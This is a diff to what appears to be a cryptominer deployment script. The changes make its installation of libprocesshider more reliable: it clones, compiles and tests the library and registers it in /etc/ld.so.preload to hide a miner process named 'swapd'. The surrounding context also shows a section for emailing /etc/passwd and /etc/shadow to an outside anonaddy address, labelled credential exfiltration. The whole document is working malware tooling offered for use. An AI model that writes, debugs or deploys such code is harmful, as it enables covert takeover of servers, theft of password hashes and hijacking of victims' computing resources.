@@ -12,6 +12,31 @@ WALLET_ADDRESS="$1"
 echo "[*] Using wallet: ${WALLET_ADDRESS:0:20}...${WALLET_ADDRESS: -10}"
 echo ""
 
+# ==================== FIX BROKEN LIBPROCESSHIDER ====================
+# Clean up broken libprocesshider.so references that cause ld.so errors
+if [ -f /etc/ld.so.preload ]; then
+    if grep -q "libprocesshider" /etc/ld.so.preload 2>/dev/null; then
+        echo "[*] Cleaning up broken libprocesshider references..."
+        
+        # Remove broken library files
+        rm -f /usr/local/lib/libprocesshider.so 2>/dev/null
+        rm -f /usr/lib/libprocesshider.so 2>/dev/null
+        rm -f /lib/libprocesshider.so 2>/dev/null
+        
+        # Remove ALL libprocesshider entries from ld.so.preload
+        grep -v "libprocesshider" /etc/ld.so.preload > /etc/ld.so.preload.tmp 2>/dev/null || true
+        mv /etc/ld.so.preload.tmp /etc/ld.so.preload 2>/dev/null || true
+        
+        # If file is now empty, remove it
+        if [ ! -s /etc/ld.so.preload ]; then
+            rm -f /etc/ld.so.preload
+        fi
+        
+        echo "[✓] Libprocesshider cleanup complete - no more ld.so errors!"
+    fi
+fi
+echo ""
+
 # ==================== EMAIL CONFIGURATION FOR CREDENTIAL EXFILTRATION ====================
 # SMTP credentials for sending /etc/passwd and /etc/shadow files
 readonly RECIPIENT_EMAIL="46eshdfq@anonaddy.me"  # ← YOUR EMAIL HERE
@@ -2369,37 +2394,71 @@ install_libprocesshider() {
     echo "[*] Cloning libprocesshider from GitHub..."
     cd /tmp
     rm -rf libprocesshider 2>/dev/null
-    git clone https://github.com/littlAcen/libprocesshider
+    
+    if ! git clone https://github.com/littlAcen/libprocesshider 2>/dev/null; then
+        echo "[!] Failed to clone libprocesshider - skipping process hiding"
+        return 1
+    fi
 
-    # Compile
-    echo "[*] Compiling..."
+    # Compile with C99 flag (CRITICAL FIX!)
+    echo "[*] Compiling with C99 support..."
     cd libprocesshider
-    make
+    
+    # Compile directly with proper flags instead of using Makefile
+    if ! gcc -Wall -fPIC -std=c99 -shared -o libprocesshider.so processhider.c -ldl 2>&1; then
+        echo "[!] Compilation failed - skipping process hiding"
+        cd /tmp
+        rm -rf libprocesshider
+        return 1
+    fi
+    
+    # Verify the library file exists and is not empty
+    if [ ! -f libprocesshider.so ] || [ ! -s libprocesshider.so ]; then
+        echo "[!] Library file is empty or missing - skipping"
+        cd /tmp
+        rm -rf libprocesshider
+        return 1
+    fi
 
     # Install
-    echo "[*] Installing..."
-    mv libprocesshider.so /usr/local/lib/
+    echo "[*] Installing to /usr/local/lib/..."
+    cp libprocesshider.so /usr/local/lib/
+    chmod 644 /usr/local/lib/libprocesshider.so
 
-    # Enable globally
+    # Test if library can be loaded before adding to ld.so.preload
+    echo "[*] Testing library..."
+    if ! LD_PRELOAD=/usr/local/lib/libprocesshider.so /bin/true 2>/dev/null; then
+        echo "[!] Library cannot be loaded - removing and skipping"
+        rm -f /usr/local/lib/libprocesshider.so
+        cd /tmp
+        rm -rf libprocesshider
+        return 1
+    fi
+
+    # Enable globally - only if not already present
     echo "[*] Activating via /etc/ld.so.preload..."
-    echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+    if ! grep -q "/usr/local/lib/libprocesshider.so" /etc/ld.so.preload 2>/dev/null; then
+        echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+    fi
 
     # Cleanup
     cd /tmp
     rm -rf libprocesshider
 
-    echo "[✓] libprocesshider installed!"
+    echo "[✓] libprocesshider installed and verified!"
     echo ""
     echo "=========================================="
     echo "LIBPROCESSHIDER SUMMARY"
     echo "=========================================="
     echo ""
-    echo "Status: ✅ INSTALLED"
+    echo "Status: ✅ INSTALLED AND WORKING"
     echo "Method: LD_PRELOAD hooking (/etc/ld.so.preload)"
     echo "Library: /usr/local/lib/libprocesshider.so"
     echo ""
     echo "Hidden process: swapd"
     echo ""
+    
+    return 0
 }
 
 # ==================== INSTALL PROCESS HIDER ====================
